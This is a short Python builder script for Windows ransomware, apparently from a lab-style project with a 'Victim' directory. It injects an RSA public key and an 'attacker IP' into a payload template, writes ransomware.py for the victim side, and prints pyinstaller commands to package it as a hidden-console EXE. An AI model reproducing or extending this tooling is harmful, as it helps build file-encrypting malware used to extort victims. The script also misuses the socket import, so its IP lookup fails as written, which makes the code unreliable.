import base64
import os
from socket import socket

print("[+] Building Windows Ransomware Payload...\n")

# Read the Public Key
with open("./Keys/public_key.pem", "rb") as f:
    public_key = f.read().strip()

# Read the Template
with open("payload_template.py", "r") as f:
    template = f.read()

# Replace the placeholder with the actual public key
try:
    with open("./Keys/public_key.pem", "r") as f:
        PUBLIC_KEY = f.read().strip()
except FileNotFoundError:
    raise Exception("Public key file not found")

payload_code = template.replace("PUBLIC_KEY", PUBLIC_KEY)

# Get Attacker IP 

def get_attacker_ip():
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

attacker_ip = get_attacker_ip()
print(f"[+] Attacker IP: {attacker_ip}")
payload_code = payload_code.replace("ATTACKER_IP", attacker_ip) 

# Save the final payload

target = os.path.abspath(
    os.path.join(os.path.dirname(__file__), '..', '..', 'Victim', 'ransomware.py')
)
os.makedirs(os.path.dirname(target), exist_ok=True)

with open(target, 'w') as f:
    f.write(payload_code)

print("[+] Payload created: ransomware.py")
print("[+] Convert to EXE on Windows using:")
print("    pip install pyinstaller")
print("    pyinstaller --onefile --noconsole ransomware.py")
print("[+] Output will be in dist/ransomware.exe")